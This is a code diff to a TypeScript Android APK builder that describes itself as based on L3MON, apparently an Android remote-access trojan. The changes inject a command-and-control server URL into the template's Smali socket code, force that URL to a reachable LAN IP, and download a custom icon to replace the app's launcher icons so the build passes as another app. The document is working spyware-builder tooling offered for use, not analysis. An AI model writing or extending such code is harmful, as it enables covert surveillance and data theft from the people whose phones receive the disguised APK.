@@ -1,10 +1,12 @@
 import { execSync } from "child_process";
-import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync } from "fs";
+import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync, readdirSync, copyFileSync } from "fs";
 import { join, resolve, dirname, basename } from "path";
 import { fileURLToPath } from "url";
 import { getDb } from "./db";
 import { apkBuilds } from "../drizzle/schema";
 import { eq } from "drizzle-orm";
+import axios from "axios";
+
 
 /**
  * Servicio de compilación de APK basado en el concepto L3MON
@@ -21,10 +23,12 @@ export interface CompilationConfig {
   enableSSL: boolean;
   ports: number[];
   iconPath?: string;
+  iconUrl?: string; // New field for remote icons
   payloadCode: string;
   obfuscate: boolean;
   targetArchitectures: string[];
 }
+
 
 export interface BuildResult {
   success: boolean;
@@ -60,7 +64,7 @@ class APKCompiler {
   /**
    * Preparar el proyecto temporal para compilar
    */
-  private prepareProject(config: CompilationConfig): string {
+  private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
     const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
     const tempProjectDir = join(buildIdDir, "project");
 
@@ -78,29 +82,31 @@ class APKCompiler {
     if (existsSync(ioSocketPath)) {
       let content = readFileSync(ioSocketPath, "utf8");
       
-      // Auto-fix URL (Protocolo y Puerto)
       let serverUrl = config.payloadCode || process.env.API_URL || "http://192.168.200.9:3001";
       if (!serverUrl.startsWith("http")) serverUrl = `http://${serverUrl}`;
       
-      // Si no tiene puerto, intentar extraer de la URL base o ENV
       try {
           const urlObj = new URL(serverUrl);
-          if (!urlObj.port) {
-              const port = process.env.PORT || process.env.WEBSOCKET_PORT || "3001";
-              serverUrl = `${urlObj.protocol}//${urlObj.hostname}:${port}`;
+          // Si el usuario puso localhost o 127.0.0.1, forzamos la IP de la red para que el APK conecte
+          if (urlObj.hostname === "localhost" || urlObj.hostname === "127.0.0.1") {
+            const os = await import("os");
+            const networkInterfaces = os.networkInterfaces();
+            const localIp = Object.values(networkInterfaces)
+              .flat()
+              .find(iface => iface?.family === 'IPv4' && !iface.internal)?.address || "192.168.200.9";
+            serverUrl = `${urlObj.protocol}//${localIp}:${urlObj.port || "3001"}`;
           }
       } catch (e) {
-          console.warn("[APKCompiler] Invalid URL in config, fallback to default IP", e);
           serverUrl = "http://192.168.200.9:3001";
       }
 
-      console.log(`[APKCompiler] Injecting Server URL: ${serverUrl}`);
-      // El placeholder en el template es "http://x:22222?model="
-      content = content.replace(/http:\/\/x:22222\?model=/g, `${serverUrl}?model=`);
+      // Replace ANY existing URL pattern in the Smali file
+      const oldPattern = /http:\/\/[^\/]+\/l3mon\?model=/g;
+      const newUrl = `${serverUrl}/l3mon?model=`;
+      content = content.replace(oldPattern, newUrl);
+
+      console.log(`[APKCompiler] Injecting Server URL: ${serverUrl}/l3mon`);
       writeFileSync(ioSocketPath, content);
-      
-      // Guardar el log para el usuario
-      if (!config.payloadCode) config.payloadCode = serverUrl; // Para que aparezca en el log global
     }
 
     // 2. Modificar App Name en strings.xml
@@ -115,8 +121,38 @@ class APKCompiler {
       }
     }
 
+    // 3. [NUEVO] Inyectar Icono personalizado
+    if (config.iconUrl) {
+      try {
+        logs.push(`[${new Date().toISOString()}] Descargando icono personalizado desde URL...`);
+        const response = await axios.get(config.iconUrl, { responseType: 'arraybuffer' });
+        const iconBuffer = Buffer.from(response.data);
+        const tempIconPath = join(buildIdDir, "custom_icon.png");
+        writeFileSync(tempIconPath, iconBuffer);
+
+        // Reemplazar en todos los directorios mipmap
+        const resDir = join(tempProjectDir, "res");
+        const mipmapDirs = readdirSync(resDir).filter(d => d.startsWith("mipmap-"));
+        
+        for (const dir of mipmapDirs) {
+          const targetDir = join(resDir, dir);
+          const iconTargets = ["ic_launcher.png", "ic_launcher_round.png"];
+          for (const target of iconTargets) {
+            const targetPath = join(targetDir, target);
+            if (existsSync(targetPath)) {
+              writeFileSync(targetPath, iconBuffer);
+            }
+          }
+        }
+        logs.push(`[${new Date().toISOString()}] Icono personalizado inyectado en todas las densidades.`);
+      } catch (e) {
+        logs.push(`[WARN] Error descargando el icono: ${e instanceof Error ? e.message : String(e)}`);
+      }
+    }
+
     return tempProjectDir;
   }
+
 
   async compileAPK(config: CompilationConfig): Promise<BuildResult> {
     const startTime = Date.now();
@@ -127,8 +163,9 @@ class APKCompiler {
       logs.push(`[${new Date().toISOString()}] Iniciando construcción Platinum (Smali Hooking)...`);
       logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
       
-      const projectDir = this.prepareProject(config);
+      const projectDir = await this.prepareProject(config, logs);
       logs.push(`Template inyectado correctamente en: ${projectDir}`);
+
 
       // Compilar con Apktool
       const unsignedApk = join(buildIdDir, "unsigned.apk");
